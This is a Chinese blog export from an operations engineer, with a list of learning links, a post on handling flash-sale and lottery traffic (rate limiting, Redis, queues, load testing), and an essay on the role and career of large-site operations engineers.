第一：方便我自己查看和学习，可以更好的找到我想要的文档。 第二：可以给自己学习结果每年做一个总结。 每3个月都会更新记录。 交流学习：🐧 Linux shell_高级运维派: 459096184 圈子 (系统运维-应用运维-自动化运维-虚拟化技术研究欢迎加入)🐧 BigData-Exchange School : 521621407 圈子（大数据运维)（Hadoop开发人员)（大数据研究爱好者) 欢迎加入 相应Bidata有内部微信交流群互相学习，加入QQ群有链接。 Linux 系统Centos源 centos源码包更新下载地址 centos 镜像下载地址 硬盘分区 格式化的ext4量超过16TB的限制(1) 格式化的ext4量超过16TB的限制(2) FileZilla filezilla下载地址 PXE pxe 无人值守安装操作系统 PXE 安装 YUM库 自动化部署-搭建YUM仓库 rpm 定制化RPM包 DNS DNS域名解析原理 开源epel 开源epel下载包 开源站点 linux_epel rpm-epel包 epel rpm软件包 samba samba配置方法 iperf 使用iperf检测主机间网络带宽 虚拟化Docker Docker 命令学习 Docker操作使用 Docker 入门学习 Docker 入门之战电子书 Docker实战（1)-(15) SSH远程登陆docker容器 部署Jenkins+docker集成环境 Esxi vsphere客户端下载 vsphere web客户端 vsphere web客户端下载 vSphere Client下载 KVM 容器平台Docker Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。 Rocket Rocket （也叫 rkt）是 CoreOS 推出的一款容器引擎，和 Docker 类似，帮助开发者打包应用和依赖包到可移植容器中，简化搭环境等部署工作。 Ubuntu（LXC） LXD 是 ubuntu 基于 LXC 技术的重构，容器天然支持非特权和分布式。LXD 与 Docker 的思路不同，Docker 是 PAAS，LXD 是 IAAS。LXC 项目由一个 Linux 内核补丁和一些 userspace 工具组成。这些 userspace 工具使用由补丁增加的内核新特性，提供一套简化的工具来维护容器。 微服务平台OpenShift OpenShift 是由红帽推出的一款面向开源开发人员开放的平台即服务(PaaS)。 OpenShift通过为开发人员提供在语言、框架和云上的更多的选择，使开发人员可以构建、测试、运行和管理他们的应用。 Cloud Foundry Cloud Foundry 是VMware于2011年4月12日推出的业界第一个开源PaaS云平台，它支持多种框架、语言、运行时环境、云平台及应用服务，使开发 人员能够在几秒钟内进行应用程序的部署和扩展，无需担心任何基础架构的问题。 Kubernetes Kubernetes 是来自 Google 云平台的开源容器集群管理系统。基于 Docker 构建一个容器的调度服务。该系统可以自动在一个容器集群中选择一个工作容器供使用。其核心概念是 Container Pod。 Mesosphere Apache Mesos 是一个集群管理器，提供了有效的、跨分布式应用或框架的资源隔离和共享，可以运行Hadoop、MPI、Hypertable、Spark。 数据库MySQL mysql 教程 MySQL官方软件包下载地址 MySQL主从配置文档 MySQL主从复制(Master-Slave)与读写分离（MySQL-Proxy）实践 Mysql架构的演化 mongodb MongoDB快速入门 MongoDB 教程 安装配置MongoDB MongoDB安装包官网地址 第1章 MongoDB的安装 第2章 MongoDB的增删改查 第3章 MongoDB的Java驱动 Robomongo 官网 MongoDB的一个客户端GUI工具 下载地址 云☁️服务CDN CDN测试排行 CDN变化 网站测速 OpenStack 每天5分钟玩转 OpenStack Red Hat Enterprise Linux和CentOS的OpenStack安装指南 如何使用OpenStack命令行工具管理虚拟机 大数据运维HBase 集群安装部署 HBase 集群安装部署 编程scriptshell shell学习网站 Linux命令大全 Python python 学习视频 Python 入门指南 Python面试题 python中文大本营 bandersnatch pip 构建快速部署的python pip环境及pypi本地源环境 CentOS 6.5 PYPI本地源制作 Web服务NGINX nginx 教程 图解http协议 nginx 配置入门 nginx 入门2 nginx 优化 nginx 优化2 nginx yum安装 脚本下载地址 tomcat JAVA企业级应用TOMCAT实战 tomcat 集群 tomcat 监控 jvm 调优 负载均衡 LVS 集群负载均衡实战 开源的分布式版本控制系统Git git教程 Gitlab gitlab官网 mailzimbra Centos6.2下安装zimbra 7.2 zimbra 自动化运维ansible Ansible 提供一种最简单的方式用于发布、管理和编排计算机系统的工具，你可在数分钟内搞定。Ansible 是一个模型驱动的配置管理器，支持多节点发布、远程任务执行。默认使用 SSH 进行远程连接。无需在被管理节点上安装附加软件，可使用各种编程语言进行扩展。 ansible指南 saltstack Saltstack 可以看做是func的增强版+Puppet的弱化版。使用Python编写。非常好用,快速可以基于EPEL部署。Salt 是一个开源的工具用来管理你的基础架构，可轻松管理成千上万台服务器。 saltstack指南 salt官网入门基础 salt使用总结 基于Salt管理iptables防火墙规则 Django 基础教程 APP持续集成部署平台Jenkins enkins安装配置 jenkins 发布系统 jenkins rpm 软件包 jenkins简单使用 Jenkins将项目发送到tomcat centos7安装文档 CentOS 安装 Jenkins 日志分析平台ELK Logstash Logstash 是一个应用程序日志、事件的传输、处理、管理和搜索的平台。你可以用它来统一对应用程序日志进行收集管理，提供 Web 接口用于查询和统计。 ELK 搭建日志分析平台 ELK 中文执指南 elk 插件管理 elk 插件使用 elk 脚本 Graylog CentOS 7安装配置Graylog Graylog——日志聚合工具中的后起之秀 Graylog 入门到精通文档 开源监控，警告&amp;分析zabbix zabbix学习论坛 zabbix入门 zabbix优化web事件打开速度 zabbix监控MySQL zabbix官方模块 grafana 二次开源安装 grafana-zabbix插件-官方网站 grafana演示站点 zabbix监控软件的使用排错 zabbix软件包下载地址 什么3.0.0的zabbix的新功能 通过ZABBIX KVM监控 个人github上面有整理比较详细的监控文档 1. zabbix通过jmx监控tomcat 2. zabbix通过jmx监控tomcat zabbix官网模板 zabbix开源监控区别 Nagios、cacti、zabbix的对比？ Nagios Nagios 是一个监视系统运行状态和网络信息的监视系统。Nagios能监视所指定的本地或远程主机以及服务，同时提供异常通知功能等。 Ganglia Ganglia 是一个跨平台可扩展的，高 性能计算系统下的分布式监控系统，如集群和网格。它是基于分层设计，它使用广泛的技术，如XML数据代表，便携数据传输，RRDtool用于数据存储和可视化。 Graphite Graphite 是一个用于采集网站实时信息并进行统计的开源项目，可用于采集多种网站服务运行状态信息。Graphite服务平均每分钟有4800次更新操作。 Kibana Kibana 是一个为 Logstash 和 ElasticSearch 提供的日志分析的 Web 接口。可使用它对日志进行高效的搜索、可视化、分析等各种操作。 团队技术平台和项目管理平台&amp;测试平台confluence团队项目协作平台 teambition confluence teambition 公司技术团队工作记录跟踪迭代平台 teambition jira-敏捷项目管理工具 jira-敏捷项目管理工具 创业公司禅道项目管理系统 禅道项目管理软件 APP推广统计数据分析 talkingdata RAP是一个可视化接口管理工具 通过分析接口结构 RAP 接口管理工具 统一的账号管理认证平台openLDAP openldap 部署1 openldap 部署2 LDAP 认证 Samba+LDAP+LAM管理工具应用 让Samba用户通过WEB页面修改密码 OpenLDAP + ProFTPD Install OpenLDAP and ProFTPD on Ubuntu 12.04 公司VPNOpenVPN Server CentOS 6上部署OpenVPN Server OpenVPN for CentOS centos 安装部署openvpn 部署参考 openVPN Tunnelblick工具下载 翻墙ssh隧道翻墙 ssh隧道翻墙 node.js 后台 如何卸载node.js 海外代理服务器平台服务器供应商 服务器 Windowswindows 防火墙 Windows Server 2008上的防火墙配置脚本 Windows系统中文换英文 Windows 7中文旗舰版与英文版自由切换 测试 openstf stf环境搭建 macaca 自动化测试 移动时代的自动化 war包仓库Maven私服nexus Centos 基础开发环境搭建之Maven私服nexus wkhtmltox-HTML效果转PDF格式 参考我博客的wkhtmltox 博客Ghost 官方-Ghost升级方法 一键安装Ghost博客 bitnami 下载一键安装Ghost脚本包 vps 安装 Ghost 博客系统记录 15个免费的Ghost博客主题 我自己整理的Ghost 20种博客主题 Ghost中文官方版 Ghost英文文档安装 Ghost博客安装，使用，更新一条龙教程 - 中文版在我github上面都有的，我安装的是7.0的。 Ghost修改端口方法文档 Ghost20种主题主题包下载：Ghost20种主题包 Ghost 博客安装中文全攻略 Ghost主题变更 Wordpress 官网 中文官网WordPress 访问有点慢。 非常有益的我是参考了建站网站有很详细说Wordpass wordpass大学 Wordpress下载插件-中文网站非常好的一位博主很详细讲了WordPress的安装过程和主题更换，插件使用等等WordPress先生 WordPress 如何搭建WordPress博客? 阿里云视频-如何在ECS上快递搭建一个WordPress站点 WordPress入门 之 安装主题和插件 hexo 这个是我现在的博客用的效果。 网上书店-非常不错 packt 已学习视频Linux 从0开始一步步实战深入学习Linux运维视频课程(三) 2014-03-28 看完 –现在这需要付费，我当初看的时候免费的，给你们个链接 越过去：http://edu.51cto.com/lesson/id-11907.html MySQL 企业Mysql实战系列入门篇 2014年3月5日看完 Mysql从入门到精通视频教程（共29集） 2015年11月3日看完 还有些网上分享的视频，存放在百度云。有数据库优化12篇视频。还有数据库架构 Docker 实战企业Docker虚拟化系列 2016年3月23日看完 Python 学会Python编程基础篇 2016-02-13 学完 监控 企业级高级监控系统cacti+nagios【马哥linux视频课程】Zabbix监控平台应用实战视频课程 收费 需要可@我 2016-09-10 学完 UbuntuUbuntu上可使用的15个桌面环境 很早就玩过了。 Ubuntu iso镜像下载地址 平面设计PS Photoshop学习教程 @@ 陆续更新 ~~ （Update time ：2016：12：11）","link":"/2016/03/15/运维笔记/个人记录💥-走上全栈运维工程师学习笔记/"},{"title":"如何解决秒杀的性能问题和微信推广活动的讨论","text":"最近业务试水微信抽奖活动，公司现在打算推广下产品。增加些粉丝量 之前经常看到淘宝的同行们讨论秒杀，讨论电商，这次终于轮到我们自己理论结合实际一次了。 ps：进入正文前先说一点个人感受，之前看淘宝的ppt感觉都懂了，等到自己出解决方案的时候发现还是有很多想不到的地方其实都没懂，再次验证了“细节是魔鬼”的理论。并且一个人的能力有限，只有大家一起讨论才能想的更周全，更细致。好了，闲话少说，下面进入正文。 一、抽奖活动带来了什么？微信积分兑换现金或抢购抽奖活动一般会经过【关注公众号】【分享活动获得积分】【积分兑换】【抽奖安全环节】这3个大环节，而其中【抢订单】这个环节是最考验业务提供方的抗压能力的。 积分兑换环节一般会带来2个问题： 1、高并发 比较火热的抽奖在线人数都是20w起的，如此之高的在线人数对于网站架构从前到后都是一种考验。 2、抽奖人员过多 3、 抢订单 任何商品都会有数量上限，如何避免成功下订单买到商品的人数不超过商品数量的上限，这是每个抢购活动都要面临的难题。 二、如何解决？首先，产品解决方案我们就不予讨论了。我们只讨论技术解决方案 1、前端架构 12345678910111213141516171819202122面对高并发的抢购活动，前端常用的三板斧是【扩容】【静态化】【限流】 A：扩容 加机器，这是最简单的方法，通过增加前端池的整体承载量来抗峰值。 这里我们都是多台主从集群去跑。 B：静态化 将活动页面上的所有可以静态的元素全部静态化，并尽量减少动态元素。通过CDN来抗峰值。 这里我们都是把图片静态放在又拍云和阿里云上面。 C：限流 一般都会采用IP级别的限流，即针对某一个IP，限制单位时间内发起请求数量。 或者活动入口的时候增加游戏或者问题环节进行消峰操作。 我们采用Nginx前面做了反向代理后面优化nginx。 D：有损服务 最后一招，在接近前端池承载能力的水位上限的时候，随机拒绝部分请求来保护活动整体的可用性。 2、后端架构 那么后端的数据库在高并发和超卖下会遇到什么问题呢？主要会有如下3个问题：（主要讨论写的问题，读的问题通过增加cache可以很容易的解决） 1234567 I： 首先MySQL自身对于高并发的处理性能就会出现问题，一般来说，MySQL的处理性能会随着并发thread上升而上升，但是到了一定的并发度之后会出现明显的拐点，之后一路下降，最终甚至会比单thread的性能还要差。 II： 其次，超卖的根结在于减库存操作是一个事务操作，需要先select，然后insert，最后update -1。最后这个-1操作是不能出现负数的，但是当多用户在有库存的情况下并发操作，出现负数这是无法避免的。 III：最后，当减库存和高并发碰到一起的时候，由于操作的库存数目在同一行，就会出现争抢InnoDB行锁的问题，导致出现互相等待甚至死锁，从而大大降低MySQL的处理性能，最终导致前端页面出现超时异常。 这个有遇到过的，就是锁表导致访问出现网络异常。 针对上述问题，如何解决呢？ 我们先看眼淘宝的高大上解决方案： 123I：关闭死锁检测，提高并发处理性能。II：修改源代码，将排队提到进入引擎层前，降低引擎层面的并发度。III：组提交，降低server和引擎的交互次数，降低IO消耗。 解决方案1：将存库从MySQL前移到Redis中，所有的写操作放到内存中，由于Redis中不存在锁故不会出现互相等待，并且由于Redis的写性能和读性能都远高于MySQL，这就解决了高并发下的性能问题。然后通过队列等异步手段，将变化的数据异步写入到DB中。 优点：解决性能问题缺点：没有解决超卖问题，同时由于异步写入DB，存在某一时刻DB和Redis中数据不一致的风险。 解决方案2：引入队列，然后将所有写DB操作在单队列中排队，完全串行处理。当达到库存阀值的时候就不在消费队列，并关闭购买功能。这就解决了超卖问题。 优点：解决超卖问题，略微提升性能。缺点：性能受限于队列处理机处理性能和DB的写入性能中最短的那个，另外多商品同时抢购的时候需要准备多条队列。 解决方案3：将写操作前移到MC中，同时利用MC的轻量级的锁机制CAS来实现减库存操作。优点：读写在内存中，操作性能快，引入轻量级锁之后可以保证同一时刻只有一个写入成功，解决减库存问题。缺点：没有实测，基于CAS的特性不知道高并发下是否会出现大量更新失败？不过加锁之后肯定对并发性能会有影响。 解决方案4：将提交操作变成两段式，先申请后确认。然后利用Redis的原子自增操作（相比较MySQL的自增来说没有空洞），同时利用Redis的事务特性来发号，保证拿到小于等于库存阀值的号的人都可以成功提交订单。然后数据异步更新到DB中。 优点：解决超卖问题，库存读写都在内存中，故同时解决性能问题。缺点：由于异步写入DB，可能存在数据不一致。另可能存在少买，也就是如果拿到号的人不真正下订单，可能库存减为0，但是订单数并没有达到库存阀值。 三、总结 121、前端三板斧【扩容】【限流】【静态化】2、后端两条路【内存】+【排队】 测试总结经验第一次做抽奖活动，测试那边测试出很多问题。 下面是遇到的问题。 12345测试第一次: 访问压测出现了访问白屏。定位：代码写的有问题。 tomcat需要做优化。 我们一般用户量粉丝在100W测试第二次： 出现数据库CPU瓶颈过高。主从同步，然后做了数据库读写分离， redis集群缓存。 最主要是数据库SQL语句做了优化。优化了提升了很大一部分。测试第三次：还有出现了503访问受限了。 后面做了nginx代理 防止同一个IP同一个时间超过多少次去请求，会被受限。 不过这个做DDOS攻击 有很大一部分影响用户名体验度。 四、非技术感想1、团队的力量是无穷的，各种各样的解决方案（先不谈可行性）都是在小伙伴们七嘴八舌中讨论出来的。我们需要让所有人都发出自己的声音，不要着急去否定。2、优化需要从整体层面去思考，不要只纠结于自己负责的部分，如果只盯着一个点思考，最后很可能就走进死胡同中了。3、有很多东西以为读过了就懂了，其实不然。依然还是需要实践，否则别人的知识永远不可能变成自己的。4、多思考为什么，会发生什么，不要想当然。只有这样才能深入进去，而不是留在表面。 交流学习：🐧 Linux shell_高级运维派: 459096184 圈子 (系统运维-应用运维-自动化运维-虚拟化技术研究欢迎加入)🐧 BigData-Exchange School : 521621407 圈子（大数据运维)（Hadoop开发人员)（大数据研究爱好者) 欢迎加入 相应Bidata有内部微信交流群互相学习，加入QQ群有链接。","link":"/2016/11/10/运维笔记/如何解决抽奖的性能问题和秒杀的讨论  /"},{"title":"运维工程师的职责和前景","text":"运维工程师的职责和前景运维中关键技术点解剖： 123451 大量高并发网站的设计方案 ；2 高可靠、高可伸缩性网络架构设计；3 网站安全问题，如何避免被黑？4 南北互联问题,动态CDN解决方案；5 海量数据存储架构 一、什么是大型网站运维？首先明确一下，全文所讲的”运维“是指：大型网站运维，与其它运维的区别还是蛮大的；然后我们再对大型网站与小型网站进行范围定义，此定义主要从运维复杂性角度考虑，如网站规范、知名度、服务器量级、pv量等考虑，其它因素不是重点； 因此，我们先定义服务器规模大于1000台，pv每天至少上亿（至少国内排名前10），如sina、baidu、QQ，51.com等等； 其它小型网站可能没有真正意义上的运维工程师，这与网站规范不够和成本因素有关，更多的是集合网络、系统、开发工作于一身的“复合性人才”，就如有些公司把一些合同采购都纳入了运维职责范围，还有如IDC网络规划也纳入运维职责。所以，非常重要一定需要明白： 1运维对其它关联工种必须非常了解熟悉：网络、系统、系统开发、存储，安全,DB等； 我在这里所讲的运维工程师就是指专职运维工程师。我们再来说说一般产品的“出生”流程： 12345671、首先公司管理层给出指导思想，PM定位市场需求（或copy成熟应用）进行调研、分析、最终给出详细设计。2、架构师根据产品设计的需求，如pv大小预估、服务器规模、应用架构等因素完成网络规划,架构设计等（基本上对网络变动不大，除非大项目）3、开发工程师将设计code实现出来、测试工程师对应用进行测试。4、好，到运维工程师出马了，首先明确一点不是说前三步就与运维工作无关了，恰恰相反，前三步与运维关系很大： 应用的前期架构设计、软/硬件资源评估申请采购、应用设计性能隐患及评估、IDC、服务性能安全调优、服务器系统级优化（与特定应用有关）等都需运维全程参与，并主导整个应用上线项目；运维工程师负责产品服务器上架准备工作，服务器系统安装、网络、IP、通用工具集安装。运维工程师还需要对上线的应用系统架构是否合理、是否具备可扩展性、及安全隐患等因素负责，并负责最后将产品（程序）、网络、系统三者进行拼接并最优化的组合在一起，最终完成产品上线提供用户使用，并周而复使：需求-&gt;开发（升级）-&gt;测试-&gt;上线（性能、安全问题等之前预估外的问题随之慢慢就全出来了）在这里提一点：网站开发模式与传统软件开发完全不一样，网站一天开发上线1~5个升级版本是家常便饭，用户体验为王嘛，如果某个线上问题像M$需要1年解决，用户早跑光了；应用上线后，运维工作才刚开始，具体工作可能包括： 升级版本上线工作、服务监控、应用状态统计、日常服务状态巡检、突发故障处理、服务日常变更调整、集群管理、服务性能评估优化、数据库管理优化、随着应用PV增减进行应用架构的伸缩、安全、运维开发工作： 1234a 、尽量将日常机械性手工工作通过工具实现（如服务监控、应用状态统计、服务上线等等），提高效率。b、解决现实中服务存在的问题，如高可靠性、可扩展性问题等。c、大规模集群管理工具的开发，如1万台机器如何在1分钟内完成密码修改、或运行指定任务？2000台服务器如何快速安装操作系统？各分布式IDC、存储集群中数PT级的数据如何快速的存储、共享、分析？等一系列挑战都需运维工程师的努力。在此说明一下其它配合工种情况，在整个项目中，前端应用对于网络/系统工程师来说是黑匣子，同时开发工程师职责只是负责完成应用的功能性开发，并对应用本身性能、安全性等应用本身负责，它不负责或关心网络/系统架构方面事宜，当然软/硬件采购人员等事业部其它同事也不会关心这些问题，各司其职，但项目的核心是运维工程师~！所有其它部门的桥梁。 举例：上面说了很多，我想大家应该对运维有一些概念了，在此打个比方吧，如果我们是一辆高速行驶在高速公路上的汽车，那运维工程师就是司机兼维修工，这个司机不简单，有时需要在高速行驶过程中换轮胎、并根据道路情况换档位、当汽车速度越来越快，汽车本身不能满足高速度时对汽车性能调优或零件升级、高速行进中解决汽车故障及性能问题、时刻关注前方安全问题，并先知先觉的采取规避手段。这就是运维工作~！ 最后说一下运维工程师的职责：”确保线上稳定“，看似简单，但实属不容易，运维工程师必须在诸多不利因素中进行权衡：新产品模式对现有架构及技术的冲击、产品高频度的升级带来的线上BUG隐患、运维自动化管理承度不高导致的人为失误、IT行业追求的高效率导致流程执行上的缺失、用户增涨带来的性能及架构上的压力、IT行业宽松的技术管理文化、创新风险、互联网安全性问题等因素，都会是网站稳定的大敌，运维工程师必须把控好这最后一关，需具体高度的责任感、原则性及协调能力，如果能做到各因素的最佳平衡，那就是一名优秀的运维工程师了。 另外在此聊点题外话，我在这里看到有很多人要sina、QQ、baidu,51.com等聊自已的运维方面的经验，其实这对于它们有点免为其难： a、各公司自已网络架构、规模、或多或少还算是公司的核心秘密，要保密，另外，对于大家所熟知的通用软件、架构，由于很多公司会根据自已实际业务需要，同时因为原版性能、安全性、已知bug、功能等原因，进行过二次开发（如apache,php,mysql），操作系统内核也会根据不同业务类型进行定制的，如某些应用属于运算型、某些是高IO型、或大存储大内存型。根据这些特点进行内核优化定制，如sina就在memcache上进行过二次开发，搞出了一个MemcacheDB，具体做得如何我们不谈，但开源了，是值得称赞的，国内公司对于开源基本上是索取，没有贡献；另外，服务器也不是大家所熟知的型号，根据业务特点，大部份都是找DELL/HP/ibm进行过定制；另外，在分布式储存方面都有自已解决方案，要不就是使用现成开源hadoop等解决方案，或自已开发。但90%都是借鉴google GFS的思想:分布式存储、计算、大表。 b、各公司业务方向不一样，会导致运维模式或方法都不一样，如51.com和baidu运维肯定区别很大，因为他们业务模式决定了其架构、服务器量级、IDC分布、网络结构、通用技术都会不一样，主打新闻门户的sina与主打sns的51.com运维模式差异就非常大,甚至职责都不大一样；但有一点，通用技术及大致架构上都大同小异，大家不要太神化，更多的公司只是玩垒积木的游戏罢了，没什么技术含量。 c、如上面所讲，目前大型网站运维还处于幼年时期理念和经验都比较零散，没有成熟的知识体系，可能具体什么是运维，大家都要先思索一番，或压根没想过，真正讨论也只是运维工作的冰山一角，局限于具体技术细节，或某某著名网站大的框架，真正运维体化东西没有，这也许是目前网上运维相关资料比较少的原故吧。或者也是国内运维人员比较难招，比较牛的运维工程师比较少见的原因之一吧。 二、运维工作师需要什么样的技能及素质做为一名运维工程师需要什么样的技能及素质呢，首先说说技能吧，如大家上面所看到，运维是一个集多IT工种技能与一身的岗位，对系统-&gt;网络-&gt;存储-&gt;协议-&gt;需求-&gt;开发-&gt;测试-&gt;安全等各环节都需要了解一些，但对于某些环节需熟悉甚至精通，如系统(基本操作系统的熟悉使用,*nix,windows..)、协议、系统开发(日常很重要的工作是自动运维化相关开发、大规模集群工具开发、管理）、通用应用（如lvs、ha、web server、db、中间件、存储等）、网络,IDC拓朴架构； 技能方面总结以下几点：1234561、开发能力，这点非常重要，因为运维工具都需要自已开发，开发语言：perl、python、php（其中之一）、shell（awk,sed,expect….等），需要有过实际项目开发经验，否则工作会非常痛苦。2、通用应用方面需要了解：操作系统（目前国内主要是linux、bsd）、webserver相关(nginx,apahe,php,lighttpd,java。。。)、数据库(mysql,oralce)、其它杂七八拉的东东；系统优化，高可靠性；这些只是加分项，不需必备，可以边工作边慢慢学，这些东西都不难。当然在运维中，有些是有分工偏重点不一样。3、系统、网络、安全，存储，CDN，DB等需要相当了解，知道其相关原理。 个人素质方面：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778791、沟通能力、团队协作：运维工作跨部门、跨工种工作很多，需善于沟通、并且团队协作能力要强；这应该是现代企业的基本素质要求了，不多说。2、工作中需胆大心细：胆大才能创新、不走寻常路，特别对于运维这种新的工种，更需创新才能促进发展；心细，运维工程师是网站admin,最高线上权限者，一不小心就会遗憾终生或打入十八层地狱。3、主动性、执行力、精力旺盛、抗压能力强：由于IT行业的特性，变化快；往往计划赶不上变化，运维工作就更突出了，比如国内各大公司服务器往往是全国各地，哪里便宜性价比高，就那往搬，进行大规模服务迁移（牵扯的服务器成百上千台），这是一个非常头痛的问题；往往时间非常紧迫，如限1周内完成，这种情况下，运维工程师的主动性及执行力就有很高的要求了：计划、方案、服务无缝迁移、机器搬迁上架、环境准备、安全评估、性能评估、基建、各关联部门扯皮,7X24小紧急事故响应等。4、其它就是一些基本素质了：头脑要灵光、逻辑思维能力强、为人谦虚稳重、亲和力、乐于助人、有大局观。5、最后一点，做网站运维需要有探索创新精神，通过创新型思维解决现实中的问题，因为这是一个处于幼年的职业（国外也一样，但比国内起步早点），没有成熟体系或方法论可以借鉴，只能靠大家自已摸索努力。三、怎样才算是一个合格的运维工程师1、保证服务达到要求的线上标准，如99.9%；保证线上稳定，这是运维工程师的基本责职所在。2、不断的提升应用的可靠性与健壮性、性能优化、安全提升；这方面非常考验主动性和创新思维。3、网站各层面监控、统计的覆盖度，软件、硬件、运行状态，能监控的都需要监控统计，避免监控死角、并能实时了解应用的运转情况。4、通过创新思维解决运维效率问题；目前各公司大部份运维主要工作还是依赖人工操作干预，需要尽可能的解放双手。5、运维知识的积累与沉淀、文档的完备性，运维是一个经验性非常强的岗位，好的经验与陷阱都需积累下来，避免重复性范错。6、计划性和执行力；工作有计划，计划后想法设法达到目标，不找借口。7、自动化运维；能对日常机械化工作进行提炼、设计并开发成工具、系统，能让系统自动完成的尽量依靠系统；让大家更多的时间用于思考、创新思维、做自已喜欢的事情。以上只是技术上的一些层面，当然个人意识也是很重要的。四、运维职业的迷惘、现状与发展前景运维岗位不像其它岗位，如研发工程师、测试工程师等，有非常明确的职责定位及职业规划，比较有职业认同感与成就感；而运维工作可能给人的感觉是哪方面都了解一些，但又都比上专职工程师更精通、感觉平时被关注度比较低（除非线上出现故障），慢慢的大家就会迷惘，对职业发展产生困惑,为什么会有这种现象呢？除了职业本身特点外，主要还是因为对运维了解不深入、做得不深入导致；其实这个问题其它岗位也会出现，但我发现运维更典型，更容易出现这个问题；针对这个问题我谈一下网站运维的现状及发展前景（也在思考中，可能不太深入全面，也请大家斧正补充）运维现状：1、处于刚起步的初级阶段，各大公司有此专职，但重视或重要程度不高，可替代性强；小公司更多是由其它岗位来兼顾做这一块工作，没有专职，也不可能做得深入。2、技术层次比较低；主要处于技术探索、积累阶段，没有型成体系化的理念、技术。3、体力劳动偏大；这个问题主要与第二点有关系，很多事情还是依靠人力进行，没有完成好的提练，对于大规模集群没有成熟的自动化管理方法，在此说明一下，大规模集群与运维工作是息息相关的如果只是百十来台机器，那就没有运维太大的生存空间了。4、优秀运维人才的极度缺乏；目前各大公司基本上都靠自已培养，这个现状导致行业内运维人才的流动性非常低，非常多好的技术都局限在各大公司内部，如 google 50万台机器科学的管理,或者国内互联公司top 10的一些运维经验，这些经验是非常有价值的东西并决定了一个公司的核心竞争力；这些问题进而导致业内先进运维技术的流通、贯通、与借签，并最终将限制了运维发展。5、很多优秀的运维经验都掌握在大公司手中；这不在于公司的技术实力，而在于大公司的技术规模、海量PV、硬件规模足够大，如baidu可怕的流量、 51.com海量数据~~~~这些因素决定了他们遇到的问题都是其它中/小公司还没有遇到的，或即将遇到。但大公司可能已有很好的解决方案或系统。发展前景：1、从行业角度来看，随着中国互联网的高速发展（目前中国网民已跃升为全球第一）、网站规模越来越来大、架构越来越复杂；对专职网站运维工程师、网站架构师的要求会越来越急迫,特别是对有经验的优秀运维人才需求量大，而且是越老越值钱；目前国内基本上都是选择毕业生培养（限于大公司），培养成本高，而且没有经验人才加入会导致公司技术更新缓慢、影响公司的技术发展；当然，毕业生也有好处：白纸一张，可塑性强，比较认同并容易融入企业文化。2、从个人角度，运维工程师技术含量及要求会越来越高，同时也是对公司应用、架构最了解最熟悉的人、越来越得到重视。3、网站运维将成为一个融合多学科（网络、系统、开发、安全、应用架构、存储等）的综合性技术岗位，给大家提供一个很好的个人能力与技术广度的发展空间。4、运维工作的相关经验将会变得非常重要，而且也将成为个人的核心竞争力，具备很好的各层面问题的解决能力及方案提供、全局思考能力等。5、特长发挥和兴趣的培养；由于运维岗位所接触的知识面非常广阔，更容易培养或发挥出个人某些方面的特长或爱好，如内核、网络、开发、数据库等方面，可以做得非常深入精通、成为这方面的专家。6、如果真要以后不想做运维了，转到其它岗位也比较容易，不会有太大的局限性。当然了，你得真正用心去做。7、技术发展方向：网站/系统架构师。五、运维关键技术点解剖1、 大规模集群管理问题首先我们先要明确集群的概念，集群不是泛指各功能服务器的总合，而是指为了达到某一目的或功能的服务器、硬盘资源的整合（机器数大于两台），对于应用来说它就是一个整体，目前常规集群可分为：高可用性集群（HA），负载均衡集群（如lvs），分布式储、计算存储集群（DFS，如google gfs,yahoohadoop），特定应用集群（某一特定功能服务器组合、如db、cache层等），目前互联网行业主要基于这四种类型；对于前两种类似，如果业务简单、应用上post操作比较少，可以简单的采用四层交换机解决（如f5），达到服务高可用/负责均衡的作用，对于资源紧张的公司也有一些开源解决办法如lvs+ha,非常灵活；对于后两种，那就考验公司技术实力及应用特点了，第三种DFS主要应用于海量数据应用上，如邮件、搜索等应用，特别是搜索要求就更高了，除了简单海量存储，还包括数据挖掘、用户行为分析；如google、yahoo就能保存分析近一年的用户记录数据，而baidu应该少于30天、soguo就更少了。。。这些对于搜索准备性、及用户体验是至关重要的。接下来，我们再谈谈如何科学的管理集群，有以下关键几点：I、监控主要包括故障监控和性能、流量、负载等状态监控，这些监控关系到集群的健康运行，及潜在问题的及时发现与干预；a、服务故障、状态监控：主要是对服务器自身、上层应用、关联服务数据交互监控；例如针对前端webserver，我们就可以有很多种类型的监控，包括应用端口状态监控，便于及时发现服务器或应用本身是否crash、通过icmp包探测服务器健康状态，更上层可能还包括应用各频道业务的监控，常用方法是采用面业特征码进行判断，或对重点页面进行签名，以网站被黑篡改（报警、并自动恢复被篡改数据）等等，这些只是一部份，还有N多监控方式，依应用特点而定，还有一些问题需解决，如集群过大，如何高性能的进行监控也是一个现实问题。b、其它就是集群状态类的监控或统计，为我们合理管理调优集群提供数据参考、包括服务瓶颈、性能问题、异常流量、攻击等问题。II、故障管理a、硬件故障问题；对于成百上千或上万机器的N多集群，服务器死机、硬件故障概率是非常大的，几乎每时每刻都有服务硬件问题，死机、硬盘损坏、电源、内存、交换机。针对这种情况，我们在设计网站架构时需要充分考虑到这些问题，并将其视为常态；更多的依靠应用的冗余机制来规避这种风险，但给系统工程师足够宽裕的处理时间。（如google不是号称同时死800台机器，服务不会受到任何影响吗）；这就是考验运维工程师及网站架构师功能的地方了，好的设计能达到google所描述自恢复能力，如gfs，糟糕的设计那就是一台服务器的死机可能会造成大面积服务的连锁故障反映，直接对用户拒绝响应。b、应用故障问题；可能是某一bug被触发、或某一性能阀值被超越、攻击等情况不一而定，但重要的一点，是要有对这些问题的预防性措施，不能想当然，它不会出问题，如真出问题了，如何应对？这需要运维工程师平时做足功夫，包括应急响应速度、故障处理的科学性、备用方案的有效等。III、自动化自动化：简而言之，就是将我们日常手动进行的一些工作通过工具，系统自动来完成，解放我们的双手及枯燥的重复性劳动，例如：没有工具前，我们安装系统需要一台一台裸机安装，如2000台，可能需要10人/10天，搞烂N张光盘，人力成本更大。。。而现在通过自动化工具，只需几个简单命令就能搞定、还有如机器人类程序，自动完成以往每天人工干预的工作，使其自动完成、汇报结果，并具备一定的专家系统能力，能做一些简单的是/非判断、优化选择等。。。这些好处非常明显不再多说。。。应该说，自动化运维是运维工程师职业化的一个追求，利已利公，虽然这是一个异常艰巨的任务：不断变更的业务、不规范化的应用设计、开发模式、网络架构变更、IDC变更、规范变动等因素，都可能会对现有自动化系统产生影响，所以需要模块化、接口化、变因参数化等因此，自动化相关工作，是运维工程师的核心重点工作之一，也是价值的体现。